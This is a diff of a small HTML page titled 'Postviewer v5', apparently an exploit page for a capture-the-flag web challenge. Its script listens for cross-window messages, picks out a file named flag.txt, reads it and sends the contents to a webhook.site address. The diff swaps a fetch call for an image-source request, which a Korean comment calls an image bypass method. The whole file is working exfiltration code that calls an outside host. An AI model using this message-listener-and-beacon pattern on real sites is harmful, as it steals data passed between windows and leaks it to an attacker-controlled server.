@@ -1,24 +1,28 @@
 <!DOCTYPE html>
 <html>
 <head>
+  <meta charset="UTF-8">
   <title>Postviewer v5</title>
 </head>
 <body>
   <h1>Postviewer v5</h1>
 
   <script>
-    window.addEventListener("message", async (e) => {
-      try {
-        const file = e.data?.files?.find(f => f.name === "flag.txt");
-        if (!file) return;
+    document.addEventListener("DOMContentLoaded", () => {
+      window.addEventListener("message", async (e) => {
+        try {
+          const file = e.data?.files?.find(f => f.name === "flag.txt");
+          if (!file) return;
 
-        const text = await file.blob.text();
+          const text = await file.blob.text();
 
-        // FLAG 유출
-        fetch("https://webhook.site/bc0069f7-ef4e-45f7-8cde-017a9e11de19?flag=" + encodeURIComponent(text));
-      } catch (err) {
-        console.error(err);
-      }
+          // 이미지 우회 방식
+          const img = new Image();
+          img.src = "https://webhook.site/bc0069f7-ef4e-45f7-8cde-017a9e11de19?flag=" + encodeURIComponent(text);
+        } catch (err) {
+          console.error(err);
+        }
+      });
     });
   </script>
 </body>
